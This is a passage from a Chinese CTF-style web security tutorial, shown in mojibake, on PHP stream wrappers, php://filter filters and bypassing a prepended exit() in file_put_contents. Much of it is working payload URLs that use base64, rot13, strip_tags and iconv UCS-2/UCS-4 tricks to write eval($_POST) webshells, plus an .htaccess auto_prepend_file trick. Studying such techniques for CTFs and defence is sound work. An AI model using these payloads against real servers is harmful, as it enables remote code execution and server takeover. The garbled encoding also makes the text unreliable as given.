å‡å±äºå‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œæ›´é‡è¦çš„æ˜¯ä¸éœ€è¦æŒ‡å®šåç¼€åï¼Œå¯ä¿®æ”¹ä¸ºä»»æ„åç¼€ï¼šjpg png gif xxx ç­‰ç­‰ã€‚ zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]%23[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]ï¼ˆ#ç¼–ç ä¸º%23ï¼‰ 12# å‹ç¼© phpinfo.txt ä¸º phpinfo.zip ï¼Œå‹ç¼©åŒ…é‡å‘½åä¸º phpinfo.jpg ?path=zip://D:\\phpStudy_pro\\WWW\\learn\\phpinfo.jpg%23phpinfo.txt compress.bzip2://file.bz2 12# å‹ç¼© phpinfo.txt ä¸º phpinfo.bz2 å¹¶ä¸Šä¼ ï¼ˆåŒæ ·æ”¯æŒä»»æ„åç¼€åï¼‰?path=compress.bzip2://D:\\phpStudy_pro\\WWW\\learn\\phpinfo.bz2 compress.zlib://file.gz 12# å‹ç¼© phpinfo.txt ä¸º phpinfo.gz å¹¶ä¸Šä¼ ï¼ˆåŒæ ·æ”¯æŒä»»æ„åç¼€åï¼‰?path=compress.zlib://D:\\phpStudy_pro\\WWW\\learn\\phpinfo.gz 2.7 data:// åè®®æ¡ä»¶ï¼š allow_url_fopen:on allow_url_include :on ä½œç”¨ï¼šè‡ªPHP&gt;=5.2.0èµ·ï¼Œå¯ä»¥ä½¿ç”¨data://æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚é€šå¸¸å¯ä»¥ç”¨æ¥æ‰§è¡ŒPHPä»£ç ã€‚ ç”¨æ³•ï¼š 12data://text/plain,data://text/plain;base64, data://text/plain, 1?path=data://text/plain,&lt;?php%20phpinfo();?&gt; data://text/plain;base64, 12?path=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2bPD9waHAKc3lzdGVtKCdscycpOwo/Pg== 2.8 http:// https:// åè®®æ¡ä»¶ï¼š allow_url_fopen:on allow_url_include :on ä½œç”¨ï¼šå¸¸è§„ URL å½¢å¼ï¼Œå…è®¸é€šè¿‡ HTTP 1.0 çš„ GETæ–¹æ³•ï¼Œä»¥åªè¯»è®¿é—®æ–‡ä»¶æˆ–èµ„æºã€‚CTFä¸­é€šå¸¸ç”¨äºè¿œç¨‹åŒ…å«ã€‚ ç”¨æ³•ï¼š 123456http://example.comhttp://example.com/file.php?var1=val1&amp;var2=val2http://user:password@example.comhttps://example.comhttps://example.com/file.php?var1=val1&amp;var2=val2https://user:password@example.com ç¤ºä¾‹ï¼š 1?file=http://127.0.0.1/phpinfo.txt 2.9 phar:// åè®®phar://åè®®ä¸zip://ç±»ä¼¼ï¼ŒåŒæ ·å¯ä»¥è®¿é—®zipæ ¼å¼å‹ç¼©åŒ…å†…å®¹ï¼Œåœ¨è¿™é‡Œåªç»™å‡ºä¸€ä¸ªç¤ºä¾‹ï¼š 1?path=phar://D:\\phpStudy_pro\\WWW\\learn\\phpinfo.zip\\phpinfo.txt 2.10 æ‰©å±•ï¼šphar://åè®®å¯¹è±¡æ³¨å…¥æŠ€æœ¯seebug - åˆ©ç”¨ phar æ‹“å±• php ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢ ä¸‰ã€PHPè¿‡æ»¤å™¨PHPè¿‡æ»¤å™¨ 3.1 å­—ç¬¦ä¸²è¿‡æ»¤å™¨ string.rot13ï¼šè‡ª PHP 4.3.0 èµ·ï¼‰ä½¿ç”¨æ­¤è¿‡æ»¤å™¨ç­‰åŒäºç”¨ str_rot13()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ® string.toupperï¼šè‡ª PHP 5.0.0 èµ·ï¼‰ä½¿ç”¨æ­¤è¿‡æ»¤å™¨ç­‰åŒäºç”¨ strtoupper()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ® è½¬æ¢ä¸ºå¤§å†™ string.tolowerï¼šè‡ª PHP 5.0.0 èµ·ï¼‰ä½¿ç”¨æ­¤è¿‡æ»¤å™¨ç­‰åŒäºç”¨ strtolower()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ® è½¬æ¢ä¸ºå°å†™ string.strip_tags ç­‰åŒäºç”¨ strip_tags()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ® å¯ä»¥ç”¨ä¸¤ç§æ ¼å¼æ¥æ”¶å‚æ•°ï¼šä¸€ç§æ˜¯å’Œ strip_tags()å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°ç›¸ä¼¼çš„ä¸€ä¸ªåŒ…å«æœ‰æ ‡è®°åˆ—è¡¨çš„å­—ç¬¦ä¸²ï¼Œä¸€ç§æ˜¯ä¸€ä¸ªåŒ…å«æœ‰æ ‡è®°åçš„æ•°ç»„ã€‚ **strip_tags ( string $str , string $allowable_tags = ? ) **ï¼šä»å­—ç¬¦ä¸²ä¸­å»é™¤ HTML å’Œ PHP æ ‡è®° 123456str è¾“å…¥å­—ç¬¦ä¸²ã€‚allowable_tags ä½¿ç”¨å¯é€‰çš„ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šä¸è¢«å»é™¤çš„å­—ç¬¦åˆ—è¡¨ã€‚æ³¨æ„:HTML æ³¨é‡Šå’Œ PHP æ ‡ç­¾ä¹Ÿä¼šè¢«å»é™¤ã€‚è¿™é‡Œæ˜¯ç¡¬ç¼–ç å¤„ç†çš„ 3.2 è½¬æ¢è¿‡æ»¤å™¨è½¬æ¢è¿‡æ»¤å™¨ å¦‚åŒ string.* è¿‡æ»¤å™¨ï¼Œconvert.* è¿‡æ»¤å™¨çš„ä½œç”¨å°±å’Œå…¶åå­—ä¸€æ ·ã€‚è½¬æ¢è¿‡æ»¤å™¨æ˜¯ PHP 5.0.0 æ·»åŠ çš„ã€‚ convert.base64-encode &amp; convert.base64-decode convert.base64-encodeå’Œ convert.base64-decodeä½¿ç”¨è¿™ä¸¤ä¸ªè¿‡æ»¤å™¨ç­‰åŒäºåˆ†åˆ«ç”¨ base64_encode()å’Œ base64_decode()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚ â€‹ convert.base64-encodeæ”¯æŒä»¥ä¸€ä¸ªå…³è”æ•°ç»„ç»™å‡ºçš„å‚æ•°ã€‚å¦‚æœç»™å‡ºäº† line-lengthï¼Œbase64 è¾“å‡ºå°†è¢«ç”¨ line-lengthä¸ªå­—ç¬¦ä¸º é•¿åº¦è€Œæˆªæˆå—ã€‚å¦‚æœç»™å‡ºäº† line-break-charsï¼Œæ¯å—å°†è¢«ç”¨ç»™å‡ºçš„å­—ç¬¦éš”å¼€ã€‚è¿™äº›å‚æ•°çš„æ•ˆæœå’Œç”¨ base64_encode()å†åŠ ä¸Š chunk_split()ç›¸åŒã€‚ convert.quoted-printable-encode &amp; convert.quoted-printable-decode convert.quoted-printable-encodeå’Œ convert.quoted-printable-decodeä½¿ç”¨æ­¤è¿‡æ»¤å™¨çš„ decode ç‰ˆæœ¬ç­‰åŒäºç”¨ quoted_printable_decode()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚ æ²¡æœ‰å’Œ convert.quoted-printable-encodeç›¸å¯¹åº”çš„å‡½æ•°ã€‚ convert.quoted-printable-encodeæ”¯æŒä»¥ä¸€ä¸ªå…³è”æ•°ç»„ç»™å‡ºçš„å‚æ•°ã€‚é™¤äº†æ”¯æŒå’Œ convert.base64-encodeä¸€æ ·çš„é™„åŠ å‚æ•°å¤–ï¼Œ convert.quoted-printable-encodeè¿˜æ”¯æŒå¸ƒå°”å‚æ•° binaryå’Œ force-encode-firstã€‚ convert.base64-decodeåªæ”¯æŒ line-break-charså‚æ•°ä½œä¸ºä»ç¼–ç è½½è·ä¸­å‰¥ç¦»çš„ç±»å‹æç¤ºã€‚ 12345&lt;?php $filename=$_GET[&#x27;filename&#x27;]; $content=$_GET[&#x27;content&#x27;]; file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);?&gt; **convert.iconv.***ï¼šè¿‡æ»¤å™¨éœ€è¦ php æ”¯æŒ iconvï¼Œè€Œ iconv æ˜¯é»˜è®¤ç¼–è¯‘çš„ã€‚ä½¿ç”¨convert.iconv.*è¿‡æ»¤å™¨ç­‰åŒäºç”¨ iconv()å‡½æ•° å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚ ä½¿ç”¨ï¼šå°†å­—ç¬¦ä¸²ä»ç¼–ç æ–¹å¼è½¬æ¢ä¸º ç¼–ç æ–¹å¼ã€‚ 123convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; or convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt; æ”¯æŒçš„ç¼–ç æ–¹å¼ï¼š 12345678910111213141516UCS-4*UCS-4BEUCS-4LE*UCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII* 3.3 å‹ç¼©è¿‡æ»¤å™¨å‹ç¼©è¿‡æ»¤å™¨ ä½¿ç”¨ zlib.deflate å‹ç¼©ï¼š 1php://filter/zlib.deflate/resource=flag.php ä½¿ç”¨ inflate è§£å‹ï¼š 12php://filter/zlib.deflate|zlib.inflate/resource=flag.php bzip2.compress å’Œ bzip2.decompress ä¸ä¸ŠåŒ 3.4 åŠ å¯†è¿‡æ»¤å™¨åŠ å¯†è¿‡æ»¤å™¨ mcrypt. å’Œ mdecrypt.** mcrypt.*å’Œ mdecrypt.*ä½¿ç”¨ libmcrypt æä¾›äº†å¯¹ç§°çš„åŠ å¯†å’Œè§£å¯†ã€‚è¿™ä¸¤ç»„è¿‡æ»¤å™¨éƒ½æ”¯æŒ mcrypt æ‰©å±•åº“ä¸­ç›¸åŒçš„ç®—æ³•ï¼Œæ ¼å¼ä¸º mcrypt.ciphernameï¼Œå…¶ä¸­ ciphernameæ˜¯å¯†ç çš„åå­—ï¼Œå°†è¢«ä¼ é€’ç»™ mcrypt_module_open()ã€‚æœ‰ä»¥ä¸‹äº”ä¸ªè¿‡æ»¤å™¨å‚æ•°å¯ç”¨ï¼š short_open_tagï¼šphp.ini å½“ä¸­çš„è¯¥é…ç½®ä¸º Onï¼Œæ„å‘³ç€å¯ä»¥ä½¿ç”¨ çŸ­æ ‡ç­¾ï¼Œå°† &lt;?php ?&gt; æ›¿æ¢ä¸º &lt;? ?&gt; ï¼Œå¹¶ä¸”åœ¨è¯¥ç§æƒ…å†µä¸‹ï¼Œ&lt;?= è¡¨ç¤º &lt;? echo å››ã€å®æˆ˜ä¹‹æ­»äº¡ç»•è¿‡4.1 bypassä¸åŒå˜é‡1234&lt;?php$filename=$_GET[&#x27;filename&#x27;];$content=$_GET[&#x27;content&#x27;];file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content); $contentåœ¨å¼€å¤´å¢åŠ äº†exitè¿‡ç¨‹ï¼Œå¯¼è‡´å³ä½¿æˆ‘ä»¬æˆåŠŸå†™å…¥ä¸€å¥è¯ï¼Œä¹Ÿæ‰§è¡Œä¸äº†ï¼ˆè¿™ä¸ªè¿‡ç¨‹åœ¨å®æˆ˜ä¸­ååˆ†å¸¸è§ï¼Œé€šå¸¸å‡ºç°åœ¨ç¼“å­˜ã€é…ç½®æ–‡ä»¶ç­‰ç­‰åœ°æ–¹ï¼Œä¸å…è®¸ç”¨æˆ·ç›´æ¥è®¿é—®çš„æ–‡ä»¶ï¼Œéƒ½ä¼šè¢«åŠ ä¸Šif(!defined(xxx))exit;ä¹‹ç±»çš„é™åˆ¶ï¼‰ã€‚é‚£ä¹ˆè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚ä½•ç»•è¿‡è¿™ä¸ªâ€œæ­»äº¡exitâ€ï¼Ÿ æ€è·¯å…¶å®ä¹Ÿå¾ˆç®€å•æˆ‘ä»¬åªè¦å°†contentå‰é¢çš„é‚£éƒ¨åˆ†å†…å®¹ä½¿ç”¨æŸç§æ‰‹æ®µï¼ˆç¼–ç ç­‰ï¼‰è¿›è¡Œå¤„ç†ï¼Œå¯¼è‡´phpä¸èƒ½è¯†åˆ«è¯¥éƒ¨åˆ†å°±å¯ä»¥äº†ã€‚ è¿™é‡Œçš„$_GET[â€˜filenameâ€™]æ˜¯å¯ä»¥æ§åˆ¶åè®®çš„. 4.1.1 base64ç»•è¿‡base64åŸç†è¯·çœ‹è¿™é‡Œ Base64ç¼–ç æ˜¯ä½¿ç”¨64ä¸ªå¯æ‰“å°ASCIIå­—ç¬¦ï¼ˆA-Zã€a-zã€0-9ã€+ã€/ï¼‰å°†ä»»æ„å­—èŠ‚åºåˆ—æ•°æ®ç¼–ç æˆASCIIå­—ç¬¦ä¸²ï¼Œå¦æœ‰â€œ=â€ç¬¦å·ç”¨ä½œåç¼€ç”¨é€”ã€‚ base64ç¼–ç ä¸­åªåŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼Œè€ŒPHPåœ¨è§£ç base64æ—¶ï¼Œé‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦æ—¶ï¼Œå°†ä¼šè·³è¿‡è¿™äº›å­—ç¬¦ï¼Œä»…å°†åˆæ³•å­—ç¬¦ç»„æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç  å½“$contentè¢«åŠ ä¸Šäº†ä»¥åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ php://filter/write=convert.base64-decode æ¥é¦–å…ˆå¯¹å…¶è§£ç ã€‚åœ¨è§£ç çš„è¿‡ç¨‹ä¸­ï¼Œå­—ç¬¦&lt; ? ; &gt; ç©ºæ ¼ç­‰ä¸€å…±æœ‰7ä¸ªå­—ç¬¦ä¸ç¬¦åˆbase64ç¼–ç çš„å­—ç¬¦èŒƒå›´å°†è¢«å¿½ç•¥ï¼Œæ‰€ä»¥æœ€ç»ˆè¢«è§£ç çš„å­—ç¬¦ä»…æœ‰â€phpexitâ€å’Œæˆ‘ä»¬ä¼ å…¥çš„å…¶ä»–å­—ç¬¦ã€‚ ç”±äºï¼Œâ€phpexitâ€ä¸€å…±7ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯base64ç®—æ³•è§£ç æ—¶æ˜¯4ä¸ªbyteä¸€ç»„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥éšä¾¿å†ç»™ä»–æ·»åŠ ä¸€ä¸ªå­—ç¬¦ã€‚è¿™æ ·å‰è¾¹çš„phpexitåŠ ä¸Šå¦ä¸€ä¸ªå­—ç¬¦å°±ä¼šè¢«base64è§£ç ï¼Œç„¶ååè¾¹çš„æˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„base64å­—ç¬¦ä¸²ä¹Ÿä¼šè¢«æˆåŠŸè§£ç ä¸ºphpä»£ç ã€‚ payload: 1?filename=php://filter/write=convert.base64-decode/resource=1.php&amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw== æˆåŠŸå†™å…¥ 4.1.2 rot13ç»•è¿‡ str_rot13() str_rot13() å‡½æ•°å¯¹å­—ç¬¦ä¸²æ‰§è¡Œ ROT13 ç¼–ç ã€‚ROT13 ç¼–ç æ˜¯æŠŠæ¯ä¸€ä¸ªå­—æ¯åœ¨å­—æ¯è¡¨ä¸­å‘å‰ç§»åŠ¨ 13 ä¸ªå­—æ¯å¾—åˆ°ã€‚æ•°å­—å’Œéå­—æ¯å­—ç¬¦ä¿æŒä¸å˜ã€‚ç¼–ç å’Œè§£ç éƒ½æ˜¯ç”±ç›¸åŒçš„å‡½æ•°å®Œæˆçš„ã€‚å¦‚æœæ‚¨æŠŠä¸€ä¸ªå·²ç¼–ç çš„å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œé‚£ä¹ˆå°†è¿”å›åŸå§‹å­—ç¬¦ä¸²ã€‚ åˆ©ç”¨php://filterä¸­string.rot13è¿‡æ»¤å™¨å»é™¤â€exitâ€ã€‚string.rot13çš„ç‰¹æ€§æ˜¯ç¼–ç å’Œè§£ç éƒ½æ˜¯è‡ªèº«å®Œæˆï¼Œåˆ©ç”¨è¿™ä¸€ç‰¹æ€§å¯ä»¥å»é™¤exitã€‚ &lt;?php exit; åœ¨ç»è¿‡rot13ç¼–ç åä¼šå˜æˆ &lt;?cuc rkvg(); ï¼Œä¸è¿‡è¿™ç§åˆ©ç”¨æ‰‹æ³•çš„å‰ææ˜¯PHPä¸å¼€å¯short_open_tagã€‚ https://www.php.net/manual/zh/ini.core.php è™½ç„¶å®˜æ–¹è¯´çš„é»˜è®¤å¼€å¯ï¼Œä½†æ˜¯åœ¨php.iniä¸­é»˜è®¤æ˜¯æ³¨é‡Šæ‰çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒè¿˜æ˜¯é»˜è®¤å…³é—­ã€‚ä½†æ˜¯æˆ‘æœ¬åœ° phpstudy æ˜¯å¼€å¯çš„ï¼Œå¯¼è‡´æ‰§è¡Œpayloadåï¼š Parse error: syntax error, unexpected &#39;rkvg&#39; (T_STRING) in E:\\phpstudy_pro\\WWW\\1\\2.php on line 1 &lt;?php eval($_POST[a]); rot13ç¼–ç å &lt;?cuc riny($_CBFG[n]); payload: 1?filename=php://filter/write=string.rot13/resource=2.php&amp;content=&lt;?cuc riny($_CBFG[n]); æˆåŠŸå†™å…¥æ–‡ä»¶ 2.php &lt;?cuc rkvg();&lt;?php eval($_POST[a]); åœ¨å…³é—­ short_open_tag = Off çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ æˆåŠŸæ‰§è¡Œå‘½ä»¤ string.strip_tags strip_tags â€” ä»å­—ç¬¦ä¸²ä¸­å»é™¤ HTML å’Œ PHP æ ‡è®°ã€‚è¯¥å‡½æ•°å°è¯•è¿”å›ç»™å®šçš„å­—ç¬¦ä¸² str å»é™¤ç©ºå­—ç¬¦ã€HTML å’Œ PHP æ ‡è®°åçš„ç»“æœã€‚å®ƒä½¿ç”¨ä¸å‡½æ•° fgetss() ä¸€æ ·çš„æœºåˆ¶å»é™¤æ ‡è®°ã€‚ ä½†æ˜¯æˆ‘ä»¬çš„ç›®çš„æ˜¯å†™å…¥webshellï¼Œå¦‚æœé‚£æ ·çš„è¯ï¼Œæˆ‘ä»¬çš„webshellå²‚ä¸æ˜¯åŒæ ·èµ·ä¸äº†ä½œç”¨ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨è¿›è¡Œç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼ˆphp://filterå…è®¸é€šè¿‡ | ä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨ï¼‰ã€‚ 123451ã€webshellç”¨base64ç¼–ç  //ä¸ºäº†é¿å…strip_tagsçš„å½±å“2ã€è°ƒç”¨string.strip_tags //è¿™ä¸€æ­¥å°†å»é™¤&lt;?php exit; ?&gt;3ã€è°ƒç”¨convert.base64-decode //è¿™ä¸€æ­¥å°†è¿˜åŸbase64ç¼–ç çš„webshell payload: ?filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=3.php&amp;content=?&gt;PD9waHAgZXZhbCgkX1BPU1RbYV0pOw== æˆåŠŸå†™å…¥ï¼š &lt;?php eval($_POST[a]); .htaccessçš„é¢„åŒ…å«åˆ©ç”¨PHPä¸­auto_prepend_fileä¸auto_append_fileç”¨æ³•å®ä¾‹åˆ†æ: https://www.jb51.net/article/55468.htm payload ?filename=php://filter/write=string.strip_tags/resource=.htaccess&amp;content=?&gt;php_value auto_prepend_file%20&quot;/flag&quot; 4.2 bypassç›¸åŒå˜é‡123&lt;?php$content = $_GET[content];file_put_contents($content,&#x27;&lt;?php exit();&#x27;.$content); è¿™ç§æƒ…å†µä¸‹å†™å…¥çš„æ–‡ä»¶ï¼Œå…¶æ–‡ä»¶åå’Œæ–‡ä»¶éƒ¨åˆ†å†…å®¹ä¸€è‡´ï¼Œè¿™å°±å¯¼è‡´åˆ©ç”¨çš„éš¾åº¦å¤§å¤§å¢åŠ äº†ï¼Œä¸è¿‡æœ€ç»ˆç›®çš„è¿˜æ˜¯ç›¸åŒçš„ï¼šéƒ½æ˜¯ä¸ºäº†å»é™¤æ–‡ä»¶å¤´éƒ¨å†…å®¹exitè¿™ä¸ªå…³é”®ä»£ç å†™å…¥shellåé—¨ã€‚ base64æ„é€ ï¼š content=php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=shell.php æˆ– content=php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php è¿›è¡Œæ‹¼æ¥ä¹‹åå°±æ˜¯ &lt;?php exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php ç„¶åä¼šå¯¹å…¶è¿›è¡Œä¸€æ¬¡æ•´ä½“çš„ base64-decode ã€‚ä»è€Œåˆ†è§£æ‰æ­»äº¡ä»£ç ï¼Œ ä½†æ˜¯æ— æ³•ç”Ÿæˆcontentï¼›è™½ç„¶æ–‡ä»¶åˆ›å»ºæˆåŠŸï¼Œä½†æ˜¯å°±æ˜¯æ— æ³•ç”Ÿæˆcontentã€‚é—®é¢˜åœ¨äºresource åè¾¹çš„ =ï¼› â€˜=â€™åœ¨base64ä¸­çš„ä½œç”¨æ˜¯å¡«å……ï¼Œä¹Ÿå°±æ˜¯ä»¥ä¸ºç€ç»“æŸï¼›åœ¨â€˜=â€™çš„åé¢æ˜¯ä¸å…è®¸æœ‰ä»»ä½•å…¶ä»–å­—ç¬¦çš„å¦åˆ™ä¼šæŠ¥é”™ï¼Œ è¿™é‡Œå› ä¸ºæ˜¯ç”±äºâ€˜=â€™ä»è€Œä½¿å¾—æˆ‘ä»¬å†™å…¥contentä¸æˆåŠŸï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æƒ³ä¸ªæ–¹æ³•å»æ‰ç­‰å·å³å¯ï¼Œ å»æ‰ç­‰å·ä¹‹è¿‡æ»¤å™¨åµŒå¥—base64payload: content=php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php å‘ç°å¯ä»¥ç”Ÿæˆæ–‡ä»¶ï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æˆåŠŸå†™å…¥äº†shellï¼›ä½†æ˜¯æ–‡ä»¶åç¡®å®æœ‰é—®é¢˜ï¼Œå½“æˆ‘ä»¬åœ¨æµè§ˆå™¨è®¿é—®çš„æ—¶å€™ï¼Œä¼šå‡ºç°è®¿é—®ä¸åˆ°çš„é—®é¢˜ï¼Œè¿™é‡Œæ˜¯å› ä¸ºå¼•å·çš„é—®é¢˜ï¼›é‚£ä¹ˆå¦‚ä½•é¿å…ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¼ªç›®å½•çš„æ–¹æ³•ï¼Œè¿›è¡Œå˜ç›¸çš„ç»•è¿‡å»ï¼› payoad: content=php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../shell.php æˆ‘ä»¬å°†å‰é¢çš„ä¸€ä¸²base64å­—ç¬¦å’Œé—­åˆçš„ç¬¦å·æ•´ä½“çœ‹ä½œä¸€ä¸ªç›®å½•ï¼Œè™½ç„¶æ²¡æœ‰ï¼Œä½†æ˜¯æˆ‘ä»¬åé¢é‡æ–°æ’¤å›äº†åŸç›®å½•ï¼Œç”Ÿæˆshell.phpæ–‡ä»¶ï¼›ä»è€Œå°±å¯ä»¥ç”Ÿæˆæ­£å¸¸çš„æ–‡ä»¶å. å»æ‰ç­‰å·ä¹‹ç›´æ¥å¯¹å†…å®¹è¿›è¡Œå˜æ€§å¦ç±»base64å…¶å®è¿™ç§ä¹Ÿæ˜¯å€ŸåŠ©äºè¿‡æ»¤å™¨ï¼Œä½†æ˜¯åŸç†å¹¶ä¸æ˜¯å’Œä¹‹å‰çš„åŸç†ä¸€æ ·ï¼Œä¹‹å‰çš„åŸç†å³æ˜¯ï¼šé—­åˆåŸæœ¬çš„æ­»äº¡ä»£ç ï¼Œç„¶ååœ¨è¿›è¡Œè¿‡æ»¤å™¨è¿‡æ»¤æ‰å†…å®¹ä¸­çš„htmlæ ‡ç­¾ï¼Œä»è€Œå¯¹å‰©ä¸‹çš„å†…å®¹è¿›è¡Œbase64è§£ç ã€‚ä½†æ˜¯è¿™ç§æ–¹æ³•å´ä¸æ˜¯å¦‚æ­¤ï¼Œpayloadå¦‚ä¸‹ï¼š php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../shell.php è¿™ç§payloadçš„æ”»å‡»åŸç†å³æ˜¯é¦–å…ˆç›´æ¥åœ¨å†…å®¹æ—¶ï¼Œå°±å°†æˆ‘ä»¬base64é‡åˆ°çš„â€˜=â€™è¿™ä¸ªé—®é¢˜ç›´æ¥å†™åœ¨ä¸­è¿›è¡Œè¿‡æ»¤æ‰ï¼Œç„¶åbase64-decodeå†å¯¹åŸæœ¬å†…å®¹çš„&lt;?php exit();è¿›è¡Œè½¬ç ï¼Œä»è€Œè¾¾åˆ°åˆ†è§£æ­»äº¡ä»£ç çš„æ•ˆæœ rot13 ç»•è¿‡å°½ç®¡base64æ¯”è¾ƒç‰¹åˆ«ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯æ‰€æœ‰çš„ç¼–ç éƒ½å—é™äºâ€˜=â€™ï¼Œè¿™é‡Œå¯ä»¥é‡‡ç”¨rot13ç¼–ç å³å¯ï¼› payload content=php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=shell.php content=php://filter/write=string.rot13/resource=&lt;?cuc cucvasb();?&gt;/../shell.php ç”Ÿæˆæ–‡ä»¶å†…å®¹ï¼š &lt;?cuc rkvg();cuc://svygre/jevgr=fgevat.ebg13|&lt;?php phpinfo();?&gt;|/erfbhepr=f1zcyr.cuc å…¶åŸç†å°±æ˜¯åˆ©ç”¨è½¬ç ä»è€Œå°†åŸæœ¬çš„æ­»äº¡ä»£ç è¿›è¡Œè½¬ç ä»è€Œä½¿å¼•æ“æ— æ³•è¯†åˆ«ä»è€Œé¿å…æ­»äº¡ä»£ç ï¼› convert.iconv.*å¯¹äºiconvå­—ç¬¦ç¼–ç è½¬æ¢è¿›è¡Œç»•è¿‡çš„æ‰‹æ³•ï¼Œå…¶å®ç±»ä¼¼äºä¸Šé¢æ‰€è¿°çš„base64ç¼–ç æ‰‹æ®µï¼Œéƒ½æ˜¯å…ˆå¯¹åŸæœ‰å­—ç¬¦ä¸²è¿›è¡ŒæŸç§ç¼–ç ç„¶åå†è§£ç ï¼Œè¿™ä¸ªè¿‡ç¨‹å¯¼è‡´æœ€åˆçš„é™åˆ¶exit;å»é™¤ï¼Œè€Œæˆ‘ä»¬çš„æ¶æ„ä»£ç æ­£å¸¸è§£ç å­˜å‚¨ã€‚ usc-2 é€šè¿‡UCS-2æ–¹å¼ï¼Œå¯¹ç›®æ ‡å­—ç¬¦ä¸²è¿›è¡Œ2ä½ä¸€åè½¬ï¼ˆè¿™é‡Œçš„2LEå’Œ2BEå¯ä»¥çœ‹ä½œæ˜¯å°ç«¯å’Œå¤§ç«¯çš„åˆ—å­ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´æ„é€ çš„æ¶æ„ä»£ç éœ€è¦æ˜¯UCS-2ä¸­2çš„å€æ•°ï¼Œä¸ç„¶ä¸èƒ½è¿›è¡Œæ­£å¸¸åè½¬ï¼ˆå¤šä½™ä¸æ»¡è¶³çš„å­—ç¬¦ä¸²ä¼šè¢«æˆªæ–­ï¼‰ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ç§è¿‡æ»¤å™¨è¿›è¡Œç¼–ç è½¬æ¢ç»•è¿‡äº† 1echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php @eval($_POST[ab]);?&gt;&#x27;); payload: php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?/resource=shell.php æˆåŠŸå‘ shell.php å†™å…¥ ?&lt;hp pxeti)(p;ph/:f/liet/rocvnre.tcino.vCU-SL2.ECU-SB2|E&lt;?php @eval($_POST[ab]);?&gt;r/seuocr=ehsle.lhp usc-4é€šè¿‡UCS-4æ–¹å¼ï¼Œå¯¹ç›®æ ‡å­—ç¬¦ä¸²è¿›è¡Œ4ä½ä¸€åè½¬ï¼ˆè¿™é‡Œçš„4LEå’Œ4BEå¯ä»¥çœ‹ä½œæ˜¯å°ç«¯å’Œå¤§ç«¯çš„åˆ—å­ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´æ„é€ çš„æ¶æ„ä»£ç éœ€è¦æ˜¯UCS-4ä¸­4çš„å€æ•°ï¼Œä¸ç„¶ä¸èƒ½è¿›è¡Œæ­£å¸¸åè½¬ï¼ˆå¤šä½™ä¸æ»¡è¶³çš„å­—ç¬¦ä¸²ä¼šè¢«æˆªæ–­ï¼‰ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ç§è¿‡æ»¤å™¨è¿›è¡Œç¼–ç è½¬æ¢ç»•è¿‡äº†. 12&lt;?phpecho iconv(&quot;UCS-4LE&quot;,&quot;UCS-4BE&quot;,&#x27;&lt;?php @eval($_POST[abcd]);?&gt;&#x27;); 